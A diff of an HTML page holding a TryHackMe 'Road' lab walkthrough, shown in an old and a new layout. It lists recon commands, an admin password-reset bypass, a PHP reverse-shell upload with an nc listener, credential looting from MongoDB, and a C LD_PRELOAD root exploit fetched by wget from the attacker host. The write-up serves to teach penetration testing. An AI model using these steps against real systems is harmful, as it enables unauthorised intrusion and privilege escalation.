@@ -1,69 +1,168 @@
-<style>
-    body {
-        font-size: 16px;
-    }
-
-    @media only screen and (max-width: 600px) {
-        body {
-            font-size: 16px;
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TryHackMe-Road-WriteUp</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
         }
-    }
-</style>
-
-<p><a href="https://tryhackme.com/r/room/road">Link to room on TryHackMe.com</a></p>
-<p>Welcome to my TryHackMe-Road-WriteUp! first we start enumeration with rustscan with this command:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>rustscan -a 10.10.2.34 -- -sC -sV</code></pre></div>
-<p>  <img src="pics/r1s.png" alt=""></p>
-<p>we see only to ports are open and there is no useful exploit for this versions of services. So we keep enumerating when we go to the site we see there is a site called sky courier.when we click button in the right top it redirects us to a login page</p>
-<p>  <img src="pics/r2.png" alt=""></p>
-<p>  <img src="pics/r3.png" alt=""></p>
-<p>to learn more about the site we register to site when we registered in profile edit page we can see what is username of admin</p>
-<p>  <img src="pics/r4.png" alt=""></p>
-<p>after some research i found a vulnerability. we can chance admin's password with burpsuite in the reset user page.</p>
-<p>  <img src="pics/r5.png" alt=""></p>
-<p>for to do that we enter password and we change our request like this to reset admin's password</p>
-<p>  <img src="pics/r6.png" alt=""></p>
-<p>after that when we login as admin we can use file upload button in profile edit page. To get a reverse shell first we open burpsuite and upload a normal .jpg file after clicking edit button we delete our .jpg files code and paste our malicious code. you can find code in here <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a> . And we change .jpg to .php . Before upload our request should look like this:</p>
-<p>  <img src="pics/r7.png" alt=""></p>
-<p>So we need to trigger our php file to do this we should know where is our file in the site. After some research i found something in site's source code</p>
-<p>  <img src="pics/r8.png" alt=""></p>
-<p>Site is putting uploaded filen in /v2/profileimages/ directory to get a reverse shell first we start our listener with this command:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>nc -lvnp 443</code></pre></div>
-<p>after that we triggering our file by visiting this site http://10.10.2.34/v2/profileimages/sh1.php</p>
-<p>and then we are in as user www-data. after that we spawn a shell with this command:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre></div>
-<p>after that we see there is a user named webdeveloper and his home directory we get our user flag</p>
-<p>  <img src="pics/r9.png" alt=""></p>
-<p>then we keep searching . After some research i found out mysql and mongodb databases runs in the server. We can find mysql credentials in /var/www/html/v2/lostpassword.php but in mysql server there is no useful data. When we look inside of the mongodb server we find webdevelopers password. to do this we use this commands:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>mongo</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>show dbs</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>use backup</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>show colllections</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>db.user.find()</code></pre></div>
-<p>  <img src="pics/r10.png" alt=""></p>
-<p>after some search i found out that user webdeveloper is in sudo group but we cant directly be root. when we use this command to see what we can do with sudo something interesting appears:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>sudo -l</code></pre></div>
-<p>  <img src="pics/r11.png" alt=""></p>
-<p>we see there is LD_PRELOAD vulnerability.To be root with this vulnerability first we code a c exploit. Source code of exploit is:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>
-    #include &lt;stdio.h&gt;
-    #include &lt;sys/types.h&gt;
-    #include &lt;stdlib.h&gt;
-    void _init() {
-    unsetenv("LD_PRELOAD");
-    setgid(0);
-    setuid(0);
-    system("/bin/sh");
-    }
         
-</code></pre></div>
-<p>then we use this commands to be root:</p>
-<p>in attacker machine we deploy a simple http server to send exploit to the target:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>python3 -m http.server 7000</code></pre></div>
-<p>in target we go to the /tmp directory and run our exploit with this commands:</p>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>cd /tmp</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>wget http://10.10.51.16:7000/shell.c</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></pre></div>
-<div style="position: relative; background-color: #d3d3d3; padding: 10px; border-radius: 5px; overflow-x: auto;"><button style='position: absolute; top: 10px; right: 10px; padding: 5px 10px; background-color: #007bff; color: white; border: none; border-radius: 3px; cursor: pointer;' onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code>sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility</code></pre></div>
-<p>  <img src="pics/r12.png" alt=""></p>
-<p>and done. We are root. Thanks for reading!</p>
+        html, body {
+            height: 100%;
+            margin: 0;
+        }
+        
+        main {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            height: 100vh;
+            padding: 20px;
+            background-color: #f7f7f7;
+            border: 1px solid #ddd;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        
+       .photo-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+       .photo-container img {
+            width: 100%;
+            height: 100vh;
+            object-fit: cover;
+            margin: 20px 0;
+            border: none; /* Remove border-radius */
+        }
+        
+       .photo-container p {
+            margin: 20px 0;
+            font-size: 18px;
+            line-height: 1.5;
+            text-align: center;
+        }
+        
+       .code-block {
+            position: relative;
+            background-color: #d3d3d3;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            width: 100%; /* Make the code block full width */
+        }
+        
+       .code-block button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            padding: 5px 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        
+       .code-block pre {
+            margin: 0;
+            padding: 10px;
+            width: 100%; /* Make the pre element full width */
+        }
+        
+        /* Responsive design */
+        @media (max-width: 600px) {
+            main {
+                padding: 10px;
+            }
+          .photo-container img {
+                height: 80vh;
+            }
+          .photo-container p {
+                font-size: 16px;
+            }
+        }
+        
+        @media (max-width: 400px) {
+            main {
+                padding: 5px;
+            }
+          .photo-container img {
+                height: 60vh;
+            }
+          .photo-container p {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <section class="photo-container">
+            <p><a href="https://tryhackme.com/r/room/road">Link to room on TryHackMe.com</a></p>
+            <p>Welcome to my TryHackMe-Road-WriteUp! first we start enumeration with rustscan with this command:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">rustscan -a 10.10.2.34 -- -sC -sV</code></pre></div>
+            <img src="r1.png" alt="Image">
+            <p>we see only two ports are open and there is no useful exploit for this versions of services. So we keep enumerating when we go to the site we see there is a site called sky courier.when we click button in the right top it redirects us to a login page</p>
+            <img src="r2.png" alt="Image">
+            <img src="r3.png" alt="Image">
+            <p>to learn more about the site we register to site when we registered in profile edit page we can see what is username of admin</p>
+            <img src="r4.png" alt="Image">
+            <p>after some research i found a vulnerability. we can chance admin's password with burpsuite in the reset user page.</p>
+            <img src="r5.png" alt="Image">
+            <p>for to do that we enter password and we change our request like this to reset admin's password</p>
+            <img src="r6.png" alt="Image">
+            <p>after that when we login as admin we can use file upload button in profile edit page. To get a reverse shell first we open burpsuite and upload a normal .jpg file after clicking edit button we delete our .jpg files code and paste our malicious code. you can find code in here <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a> . And we change .jpg to .php . Before upload our request should look like this:</p>
+            <img src="r7.png" alt="Image">
+            <p>So we need to trigger our php file to do this we should know where is our file in the site. After some research i found something in site's source code</p>
+            <img src="r8.png" alt="Image">
+            <p>Site is putting uploaded filen in /v2/profileimages/ directory to get a reverse shell first we start our listener with this command:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">nc -lnvp 443</code></pre></div>
+            <p>after that we triggering our file by visiting this site http://10.10.2.34/v2/profileimages/sh1.php</p>
+            <p>and then we are in as user www-data. after that we spawn a shell with this command:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">python3 -c 'import pty;pty.spawn("/bin/bash")'</code></pre></div>
+            <p>after that we see there is a user named webdeveloper and his home directory we get our user flag</p>
+            <img src="r9.png" alt="Image">
+            <p>then we keep searching . After some research i found out mysql and mongodb databases runs in the server. We can find mysql credentials in /var/www/html/v2/lostpassword.php but in mysql server there is no useful data. When we look inside of the mongodb server we find webdevelopers password. to do this we use this commands:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">mongo</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">show dbs</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">use backup</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">show collections</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">db.user.find()</code></pre></div>
+            <img src="r10.png" alt="Image">
+            <p>after some search i found out that user webdeveloper is in sudo group but we cant directly be root. when we use this command to see what we can do with sudo something interesting appears:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">sudo -l</code></pre></div>
+            <img src="r11.png" alt="Image">
+            <p>we see there is LD_PRELOAD vulnerability.To be root with this vulnerability first we code a c exploit. Source code of exploit is:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">
+                #include &lt;stdio.h&gt;
+                #include &lt;sys/types.h&gt;
+                #include &lt;stdlib.h&gt;
+                void _init() {
+                unsetenv("LD_PRELOAD");
+                setgid(0);
+                setuid(0);
+                system("/bin/sh");
+                }
+
+            </code></pre></div>
+            <p>then we use this commands to be root:</p>
+            <p>in attacker machine we deploy a simple http server to send exploit to the target:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">python3 -m http.server 7000</code></pre></div>            <p>in target we go to the /tmp directory and run our exploit with this commands:</p>
+            <p>in target we go to the /tmp directory and run our exploit with this commands:</p>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">cd /tmp</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">wget http://10.10.51.16:7000/shell.c</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">gcc -fPIC -shared -o shell.so shell.c -nostartfiles</code></pre></div>
+            <div class="code-block"><button onclick="navigator.clipboard.writeText(this.nextElementSibling.innerText).then(() => { this.innerText='Copied'; setTimeout(() => { this.innerText='Copy Code'; }, 2000); });">Copy Code</button><pre><code style="width: 100%;">sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility</code></pre></div>
+            <img src="r12.png" alt="Image">
+            <p>and done. We are root. Thanks for reading!</p>
+        </section>
+    </main>
+</body>
+</html>
